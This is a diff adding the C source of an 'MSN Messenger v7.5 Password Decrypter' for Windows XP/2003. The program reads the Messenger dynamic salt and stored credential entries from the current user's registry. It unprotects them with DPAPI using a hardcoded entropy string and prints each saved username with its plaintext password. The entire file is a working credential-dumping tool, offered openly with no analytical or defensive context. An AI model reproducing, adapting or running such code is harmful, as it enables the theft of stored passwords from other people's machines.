@@ -1,0 +1,291 @@
+/*
+ *  MSN Messenger v7.5 Password Decrypter Source Code for Windows XP & 2003
+ *  (Compiled - VC++ 2005, Tested on WinXP SP2, MSN Messenger v7.5.0324)
+ *      - Gregory R. Panakkal
+ *        http://www.infogreg.com/
+ */
+
+#include <windows.h>
+#include <wincrypt.h>
+#include <stdio.h>
+#include <WinCred.h>
+#include <tchar.h>
+
+#pragma comment(lib, "Crypt32.lib")
+
+void showBanner()
+{
+    _tprintf(_T("MSN Messenger v7.5 Password Decrypter for Windows XP/2003\n"));
+    _tprintf(_T("   - Gregory R. Panakkal, http://www.infogreg.com \n\n"));
+}
+
+////////////////////////////////////////////////////////////////////
+int main()
+{
+    PCREDENTIAL* CredentialCollection = NULL;
+    DATA_BLOB blobCrypt;
+    DATA_BLOB blobPlainText;
+    DATA_BLOB blobEntropy;
+    DATA_BLOB blobDynEntropy;
+    HKEY hKeyDynSalt = NULL;
+    HKEY hKeyCreds = NULL;
+    HKEY hKeyUserCred = NULL;
+    DWORD dwRet = 0;
+    DWORD dwType = 0;
+    DWORD dwDataSize = 0;
+    DWORD dwTemp = 0;
+    PBYTE pDynamicSalt = NULL;
+    PBYTE pEncPassword = NULL;
+    TCHAR szMsgrUserName[MAX_PATH];
+    DWORD dwCount = 0;
+    REGSAM RegSAM = KEY_READ;
+    WCHAR szEntropy[] = L"%GKP$^%^&LL(%^$^O&TR$^%^GV6;lxzd";
+
+    ZeroMemory(&blobCrypt, sizeof(blobCrypt) );
+    ZeroMemory(&blobPlainText, sizeof(blobPlainText) );
+    ZeroMemory(&blobEntropy, sizeof(blobEntropy) );
+    ZeroMemory(&blobDynEntropy, sizeof(blobDynEntropy) );
+
+    showBanner();
+
+    do
+    {
+        //
+        // Allocate some memory!
+        //
+        pEncPassword = (PBYTE)malloc( MAX_PATH );
+
+        if(NULL == pEncPassword)
+        {
+            _tprintf(_T("ERROR: malloc failed!"));
+            break;
+        }
+
+
+        //
+        // Fetch & Calculate Dynamic Salt
+        //
+        dwRet = RegOpenKeyEx(
+                    HKEY_CURRENT_USER,
+                    _T("SOFTWARE\\MICROSOFT\\IdentityCRL\\Dynamic Salt"),
+                    0,
+                    RegSAM,
+                    &hKeyDynSalt
+                    );
+
+        if(ERROR_SUCCESS != dwRet)
+        {
+            _tprintf(_T("ERROR: Cannot opening dynamic salt reg key!"));
+            break;
+        }
+
+        dwTemp = sizeof(dwDataSize);
+
+        dwRet = RegQueryValueEx(
+                    hKeyDynSalt,
+                    _T("Size"),
+                    NULL,
+                    &dwType,
+                    (LPBYTE)&dwDataSize,
+                    &dwTemp
+                    );
+
+        if( ERROR_SUCCESS != dwRet ||
+            REG_DWORD != dwType ||
+            sizeof(DWORD) != dwTemp )
+        {
+            _tprintf(_T("ERROR: Cannot fetch dynamic salt data size!"));
+            break;
+        }
+
+        pDynamicSalt = (PBYTE)malloc( dwDataSize );
+
+        if(NULL == pDynamicSalt)
+        {
+            _tprintf(_T("ERROR: malloc failed!"));
+            break;
+        }
+
+        dwTemp = dwDataSize;
+
+        dwRet = RegQueryValueEx(
+                    hKeyDynSalt,
+                    _T("Value"),
+                    NULL,
+                    &dwType,
+                    (LPBYTE)pDynamicSalt,
+                    &dwTemp);
+
+
+        if( ERROR_SUCCESS != dwRet ||
+            REG_BINARY != dwType ||
+            dwDataSize != dwTemp )
+        {
+            _tprintf(_T("ERROR: Cannot fetch dynamic salt data!"));
+            break;
+        }
+
+        //Initial Crypt Blob
+        blobCrypt.pbData = (LPBYTE)pDynamicSalt;
+        blobCrypt.cbData = dwDataSize;
+
+
+        //Initialize Entropy Blob
+        blobEntropy.pbData = (LPBYTE)&szEntropy;
+        blobEntropy.cbData = 0x40;
+
+        if(FALSE == CryptUnprotectData(
+                            &blobCrypt,
+                            NULL,
+                            &blobEntropy,
+                            NULL,
+                            NULL,
+                            1,
+                            &blobPlainText
+                        ))
+        {
+            //something
+            break;
+        }
+
+        //
+        // Construct the 128 Char long Entropy value
+        //
+
+        memcpy(
+            blobCrypt.pbData,
+            blobEntropy.pbData, blobEntropy.cbData
+            );
+
+        memcpy(
+            blobCrypt.pbData + blobEntropy.cbData,
+            blobPlainText.pbData,
+            blobPlainText.cbData
+            );
+
+        blobEntropy.cbData += blobPlainText.cbData;
+        blobEntropy.pbData = blobCrypt.pbData;
+
+
+        //Free memory & Zero-off Blob structure
+        LocalFree(blobPlainText.pbData);
+        ZeroMemory(&blobPlainText, sizeof(blobPlainText));
+
+
+        //
+        // Enumerate all the stored credentials in the registry
+        //
+
+        dwRet = RegOpenKeyEx(
+                    HKEY_CURRENT_USER,
+                    _T("SOFTWARE\\MICROSOFT\\IdentityCRL\\Creds"),
+                    0,
+                    RegSAM,
+                    &hKeyCreds
+                    );
+
+        if(ERROR_SUCCESS != dwRet)
+        {
+            _tprintf(_T("ERROR: Cannot opening credential key!"));
+            break;
+        }
+
+        while( true )
+        {
+            dwRet = RegEnumKey(
+                        hKeyCreds,
+                        dwCount,
+                        (LPTSTR)&szMsgrUserName,
+                        MAX_PATH
+                        );
+
+            if( ERROR_SUCCESS != dwRet )
+            {
+                break;
+            }
+
+            dwRet = RegOpenKeyEx(
+                        hKeyCreds,
+                        szMsgrUserName,
+                        0,
+                        RegSAM,
+                        &hKeyUserCred
+                        );
+
+            if(ERROR_SUCCESS == dwRet)
+            {
+                dwTemp = MAX_PATH;
+
+
+                //
+                // Read encrypted passsword
+                //
+
+                dwRet = RegQueryValueEx(
+                            hKeyUserCred,
+                            _T("ps:password"),
+                            NULL,
+                            &dwType,
+                            (LPBYTE)pEncPassword,
+                            &dwTemp);
+
+                if( ERROR_SUCCESS == dwRet &&
+                    REG_BINARY == dwType )
+                {
+                    blobCrypt.pbData = (LPBYTE)pEncPassword;
+                    blobCrypt.cbData = dwTemp;
+
+                    //
+                    // Decrypt & Display Credential Info!
+                    //
+                    if(TRUE == CryptUnprotectData(
+                                        &blobCrypt,
+                                        NULL,
+                                        &blobEntropy,
+                                        NULL,
+                                        NULL,
+                                        1,
+                                        &blobPlainText
+                                    ))
+                    {
+                        _tprintf(
+                            _T("Username : %s\nPassword : %ws\n\n"),
+                            szMsgrUserName,
+                            blobPlainText.pbData
+                            );
+
+                        LocalFree(blobPlainText.pbData);
+                    }
+                }
+
+                //Close User Cred Key
+                RegCloseKey(hKeyUserCred);
+                hKeyUserCred = NULL;
+            }
+
+            dwCount++;
+        }
+
+    }while(false);
+
+
+    if(NULL != pDynamicSalt)
+    {
+        free(pDynamicSalt);
+    }
+
+    if(NULL != pEncPassword)
+    {
+        free(pEncPassword);
+    }
+
+    if(NULL != hKeyCreds)
+    {
+        RegCloseKey(hKeyCreds);
+    }
+
+    if(NULL != hKeyDynSalt)
+    {
+        RegCloseKey(hKeyDynSalt);
+    }
+}
